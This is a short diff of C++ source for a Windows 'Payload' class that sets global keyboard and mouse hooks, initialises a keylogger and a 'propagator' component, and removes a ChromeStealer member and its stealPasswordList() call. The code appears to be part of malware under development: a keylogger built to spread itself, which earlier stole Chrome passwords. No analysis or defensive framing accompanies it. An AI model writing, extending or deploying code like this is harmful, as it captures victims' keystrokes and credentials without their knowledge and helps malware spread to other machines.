@@ -4,7 +4,6 @@ Payload *Payload::current = NULL;
 HINSTANCE Payload::Instance;
 HHOOK Payload::KeyboardHook;
 HHOOK Payload::MouseHook;
-ChromeStealer Payload::Stealer;
 
 Payload::Payload(void)
 {
@@ -16,7 +15,6 @@ Payload::~Payload(void)
 
 void Payload::init(void)
 {
-	Payload::Stealer.stealPasswordList();
 	_keylogger.init();
 	_ppgt.init();
 }
@@ -60,7 +58,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		Payload::current->propagator().update();
 
 		LPKBDLLHOOKSTRUCT key = (LPKBDLLHOOKSTRUCT)(lParam);
-
+		
 		switch (wParam)
 		{
 		case WM_SYSKEYDOWN:
